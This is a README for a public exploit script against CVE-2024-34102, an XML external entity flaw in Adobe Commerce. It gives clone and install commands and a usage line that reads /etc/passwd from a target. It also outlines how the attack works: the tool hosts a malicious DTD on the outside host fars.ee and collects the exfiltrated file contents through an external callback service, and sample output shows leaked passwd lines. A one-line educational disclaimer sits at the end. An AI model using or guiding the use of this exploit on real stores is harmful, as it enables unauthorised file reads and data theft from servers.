# 🚨 CVE-2024-34102 Exploit Script 🚨

## Description

This script exploits a Server-Side Request Forgery (SSRF) vulnerability in Adobe Commerce versions 2.4.7, 2.4.6-p5, 2.4.5-p7, 2.4.4-p8, and earlier. The vulnerability allows for arbitrary code execution by sending a crafted XML document that references external entities. Exploitation of this issue does not require user interaction.

## Installation

1. 📥 **Clone the repository:**
    ```sh
    git clone https://github.com/Chocapikk/CVE-2024-34102.git
    cd CVE-2024-34102
    ```

2. 📦 **Install the required packages:**
    ```sh
    pip install -r requirements.txt
    ```

## Usage

### Basic Command

```sh
python exploit.py -u <target_url> -f <file_to_read>
```

### Example

```sh
python exploit.py -u http://example.com -f /etc/passwd
```

### Options

- `-u`, `--url` (required): Specify the target URL or domain.
- `-f`, `--file` (optional): Specify the file to read from the server. Default is `/etc/passwd`.

## How It Works

1. **Initialization**:
   - Input: Target URL and file to read (default: `/etc/passwd`)
   - Disable security warnings

2. **Generate Callback URL**:
   - Create a unique DTD file containing malicious XML entities.
   - Host the DTD file on fars.ee.
   - Print the created callback URL and the file to be read.

3. **Obtain Instance ID**:
   - Obtain an instance ID from the SSRF API.

4. **Send Malicious Request**:
   - Construct a request with the malicious DTD URL.
   - Send the request to the target URL.

5. **Check Exploitation Success**:
   - Check instance logs from the SSRF API.
   - Decode and display the exfiltrated data if the exploitation is successful.

6. **Cleanup**:
   - Clear instance logs.
   - Delete the instance.

7. **Output Result and Finish**:
   - Print whether the target URL is vulnerable or not.

## Example Output

```sh
[+] Created Callback URL: https://fars.ee/abcd1234.dtd
[+] File to be read: /etc/passwd
[+] Decoded Exploited Data: 
root:x:0:0:root:/root:/bin/bash
...
[+] Vulnerable URL: http://example.com
```

## Notes

- ⚠️ **Disclaimer**: This script is for educational purposes only. Unauthorized use of this script against a target without permission is illegal.
- 💡 **Tip**: Always ensure you have permission to test a target system for vulnerabilities.

## Credits

- ❤️ Credits to @th3gokul & Sanjaith3hacker for the original code base.
